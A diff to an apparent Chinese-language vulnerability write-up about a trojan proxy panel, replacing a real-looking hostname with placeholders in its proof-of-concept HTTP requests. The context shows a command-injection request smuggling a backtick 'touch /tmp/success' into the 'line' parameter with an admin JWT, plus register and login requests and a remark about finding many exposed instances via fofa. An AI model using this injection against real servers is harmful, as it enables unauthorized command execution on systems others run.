@@ -226,13 +226,13 @@ poc
 
 ```go
 GET /trojan/log?line=300`touch%20/tmp/success`&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjQxNzkzNDcsImlkIjoiYWRtaW4iLCJvcmlnX2lhdCI6MTY2NDE3MjE0N30.iuFiunMc5kx8q4_2CZzAnGQPLjpSK0BW_1X6_bRdP04 HTTP/1.1
-Host: 123.centos-stream.org
+Host: xxx.xxx.com
 Connection: Upgrade
 Pragma: no-cache
 Cache-Control: no-cache
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
 Upgrade: websocket
-Origin: http://123.centos-stream.org
+Origin: http://xxx.xxx.com
 Sec-WebSocket-Version: 13
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
@@ -274,8 +274,8 @@ func Auth(r *gin.Engine, timeout int) *jwt.GinJWTMiddleware {
 poc
 
 ```go
-POST http://123.centos-stream.org/auth/register HTTP/1.1
-Host: 123.centos-stream.org
+POST http://xxx.xxx.com/auth/register HTTP/1.1
+Host: xxx.xxx.com
 Content-Length: 195
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymc8kPkyHhSLWSsTf
@@ -301,8 +301,8 @@ fofa找找,大量的免费机场🥰
 抓下登录包
 
 ```
-POST http://123.centos-stream.org/auth/login HTTP/1.1
-Host: 123.centos-stream.org
+POST http://xxx.xxx.com/auth/login HTTP/1.1
+Host: xxx.xxx.com
 Content-Length: 90
 Content-Type: application/json
 Accept-Language: zh-CN,zh;q=0.9Connection: close
